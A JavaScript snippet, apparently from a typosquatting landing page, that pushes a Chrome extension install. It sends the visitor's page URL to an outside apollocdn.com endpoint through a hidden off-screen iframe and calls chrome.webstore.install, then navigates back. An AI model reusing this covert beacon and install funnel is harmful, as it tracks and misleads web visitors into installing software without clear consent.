<script>

      var jsonToUrlParams = function(obj){
        var d = obj;

        var str = '';
        var arr = new Array();
        for(var key in d){
            
            arr.push( key + "=" + d[key] );

        }
        if(arr.length > 0){
            str += arr.pop(0);
            for(var index in arr){
                str+="&";
                str += arr[index];
            }
            

        }
        return str;

      };
      var buildUrlEvent = function(url , jsonUrlParams){
        var str = "";
        str += url + "?" + jsonToUrlParams(jsonUrlParams);
        return str;
      };

      var reportEvent = function(src , callback){
  
                      try {
                      var iframe = document.createElement("iframe");
                      iframe.style["top"] = "-10000px";
                      iframe.style["left"] = "-10000px";
                      iframe.style["position"] = "relative";
                      iframe.style["width"] = "0px";
                      iframe.style["height"] = "0px";
                      iframe.style["border"] = "none";
                      //iframe.style["display"] = "none";
                      iframe.width =1;
                      iframe.height =1;
                      iframe.src = src;
                      if(typeof callback !== "undefined" && callback !== "" && callback !== null){
                        iframe.onload = callback;
                      }
                      document.body.appendChild(iframe);
  
  
                      } catch (E111) {
  
                      }
  
          };

      var reportQuick = function(topic , callback){
        var jsonUrlParams = {
                    type:"quick",
                    topic:topic,
					url:encodeURIComponent(document.URL),
                    
                    
                cb:Math.random()
                
              };
        var url = "https://endall41-q.apollocdn.com/dealdo/event-report";
        url = buildUrlEvent(url , jsonUrlParams);
        var suffix = "";
        
        reportEvent(url + suffix , callback);


    };


  var succFunc = function(a){
    console.log(a)
    reportQuick("typosucvv16" , function(){
      history.back();
    } );
  };
  var failFunc = function(a){
    reportQuick("typofailvv16" , function(){
      history.back();
    } );
  };

  reportQuick("typoimpvv16");

  handleClk = function(){
    chrome.webstore.install('https://chrome.google.com/webstore/detail/hiohikggdjlojnlhbkahkkeggklamphf',succFunc , failFunc);
    setTimeout(function(){
      document.getElementById("cover").style.display = "block";
    } ,500);
  };
  
</script>
